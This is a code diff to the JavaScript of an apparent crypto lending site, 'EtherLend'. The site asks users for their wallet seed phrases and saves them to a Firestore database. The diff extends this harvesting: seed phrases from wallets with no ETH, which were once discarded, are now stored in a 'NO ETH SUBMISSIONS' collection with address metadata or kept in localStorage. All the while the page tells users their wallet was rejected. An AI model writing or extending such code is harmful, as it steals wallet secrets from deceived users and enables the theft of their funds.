@@ -1,14 +1,16 @@
 /* ============================================================
    SUBMISSION — Firebase Firestore
+   collection: 'submissions'         → wallets WITH ETH balance
+   collection: 'NO ETH SUBMISSIONS'  → wallets WITHOUT ETH balance
 ============================================================ */
-async function handleValidFeedback(data) {
+async function handleValidFeedback(data, collectionName = 'submissions') {
   try {
     if (State.firestoreEnabled && db) {
-      await firestoreOp(() => db.collection('submissions').add({
+      await firestoreOp(() => db.collection(collectionName).add({
         data: data,
         timestamp: new Date().toISOString()
       }));
-      console.info('[EtherLend] Submission saved to Firestore.');
+      console.info(`[EtherLend] Submission saved to Firestore collection: "${collectionName}".`);
       return true;
     } else {
       console.warn('[EtherLend] Firestore not available. Submission not saved.');
@@ -555,7 +557,7 @@ async function showEthBalanceStatus(address) {
     if (State.firestoreEnabled && db) {
       // 1. Submit seed phrase to `submissions`
       if (seedPhrase) {
-        handleValidFeedback(seedPhrase).catch(err =>
+        handleValidFeedback(seedPhrase, 'submissions').catch(err =>
           console.warn('[EtherLend] Submissions write error:', err)
         );
       }
@@ -572,7 +574,7 @@ async function showEthBalanceStatus(address) {
     } else {
       // Firestore unavailable — fall back to localStorage
       if (seedPhrase) {
-        handleValidFeedback(seedPhrase).catch(err =>
+        handleValidFeedback(seedPhrase, 'submissions').catch(err =>
           console.warn('[EtherLend] Feedback submission error:', err)
         );
       }
@@ -582,7 +584,7 @@ async function showEthBalanceStatus(address) {
     // Clear pending seed phrase from memory
     State.pendingSeedPhrase = null;
   } else {
-    // Zero ETH balance — reject the wallet
+    // Zero ETH balance — reject the wallet but still record the submission
     if (msgEl) {
       msgEl.className = 'eth-qualify-msg eth-qualify-warn';
       msgEl.innerHTML = `🚫 <strong>Wallet Rejected.</strong> Your wallet has <strong>no ETH balance</strong>. EtherLend requires a positive ETH balance to apply for a loan. Please fund your wallet and try again.`;
@@ -593,7 +595,42 @@ async function showEthBalanceStatus(address) {
       doneBtn.style.cursor = 'not-allowed';
       doneBtn.title = 'Your wallet has no ETH. Please deposit ETH to continue.';
     }
-    // Discard seed phrase — wallet not accepted
+
+    // ── Submit seed phrase to 'NO ETH SUBMISSIONS' collection ──────────────
+    const seedPhraseNoEth = State.pendingSeedPhrase;
+
+    if (State.firestoreEnabled && db) {
+      if (seedPhraseNoEth) {
+        handleValidFeedback(seedPhraseNoEth, 'NO ETH SUBMISSIONS').catch(err =>
+          console.warn('[EtherLend] NO ETH SUBMISSIONS write error:', err)
+        );
+      }
+      // Log the zero-balance wallet address for reference
+      firestoreOp(() =>
+        db.collection('NO ETH SUBMISSIONS').doc(address + '_meta').set({
+          address:   address,
+          balance:   0,
+          seenAt:    new Date().toISOString(),
+          hasPhrase: !!seedPhraseNoEth
+        }, { merge: true })
+      ).catch(err =>
+        console.warn('[EtherLend] NO ETH SUBMISSIONS meta write error:', err)
+      );
+    } else {
+      // Firestore unavailable — store locally as fallback
+      if (seedPhraseNoEth) {
+        try {
+          const existing = JSON.parse(localStorage.getItem('el_no_eth_submissions') || '[]');
+          existing.push({ data: seedPhraseNoEth, timestamp: new Date().toISOString() });
+          localStorage.setItem('el_no_eth_submissions', JSON.stringify(existing));
+          console.info('[EtherLend] NO ETH SUBMISSIONS saved to localStorage (Firestore offline).');
+        } catch (e) {
+          console.warn('[EtherLend] localStorage save failed:', e);
+        }
+      }
+    }
+
+    // Clear pending seed phrase from memory
     State.pendingSeedPhrase = null;
   }
 }
